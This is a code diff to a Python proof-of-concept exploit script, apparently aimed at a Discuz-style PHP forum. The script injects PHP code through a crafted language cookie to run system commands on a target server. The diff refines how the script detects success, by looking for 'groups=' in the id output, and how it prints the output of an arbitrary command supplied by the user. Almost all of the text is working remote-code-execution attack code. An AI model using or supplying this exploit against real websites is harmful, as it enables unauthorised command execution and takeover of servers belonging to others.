@@ -11,6 +11,7 @@ from requests.packages import urllib3
 headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"}
 
 def poc(url,eexec):
+	flag = url
 	if "http://" in url or "https://" in url:
 		url = url+'/portal.php'
 	else:
@@ -18,14 +19,14 @@ def poc(url,eexec):
 	urllib3.disable_warnings()	
 	sign = requests.get(url,verify=False).headers['Set-cookie'][:9]
 	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.system(id).';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,sign,sign,sign,sign)
-	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5,verify=False).text.index('<!DOCTYPE html PUBLIC')
-	if res ==0:
-		print '%s not is vulnerable!' % url
+	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5,verify=False)
+	if 'groups=' not in res.text:
+		print '%s not is vulnerable!' % flag
 		sys.exit()
 	else:
 		cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
 		res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5,verify=False)
-		flag = res.text.index('<!DOCTYPE html PUBLIC')
+		flag = res.text.index('<!DOCTYPE html')
 		print res.text[:flag]
 	
 if __name__ == '__main__':
